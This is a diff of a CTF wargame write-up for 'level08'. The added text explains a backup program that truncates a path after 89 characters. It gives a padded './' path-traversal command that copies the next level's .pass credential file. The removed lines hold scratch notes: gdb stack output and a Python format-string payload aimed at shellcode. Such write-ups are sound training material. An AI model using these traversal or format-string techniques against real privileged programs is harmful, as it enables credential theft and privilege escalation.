@@ -1,34 +1,10 @@
-0x400d6d -- address backlog
+Running executable level08 demonstrates that it creates exact copy of 
+file that is receives as a first argument to ./backups folder. 
+To create backup file program concatinats argv with string "./backups". However,
+It concatenates only 89 characters. We can add 89 characters and then add relative path
+to /home/users/level09/.pass so we cat create readable .pass file in ./backups. 
+We also need to pass filename for backup file to be created with this name and it should be the same as folder inside user directory.
+That's why we also need to put backups between relative paths.
+Exploit looks like this:
 
-0x7fffffffe8e4
-
-change filename to .log
-
-0x45485300 .log in hex
-
-
-import struct;print(struct.pack('I', 0x7fffffffe8e4) + struct.pack('I', 0x7fffffffe8e8) + "%21232x%hn)
-
-
-
-
-info frame log_wrapper 
-
-Stack level 0, frame at 0x7fffffffe520:
- rip = 0x400904 in log_wrapper; saved rip 0x400ab3
- called by frame at 0x7fffffffe5e0
- Arglist at 0x7fffffffe510, args: 
- Locals at 0x7fffffffe510, Previous frame's sp is 0x7fffffffe520
- Saved registers:
-  rbp at 0x7fffffffe510, rip at 0x7fffffffe518
-
-
-
-address of shellcode
-
-0x7fff 0xffff 0xe8d7
-
-delete above 
-just do
-
-./level08 ./././././././././././././././././././././././././././././././././././././././././backups/../../level09/.pass
+./level08 "./././././././././././././././././././././././././././././././././././././././././backups/../../level09/.pass"
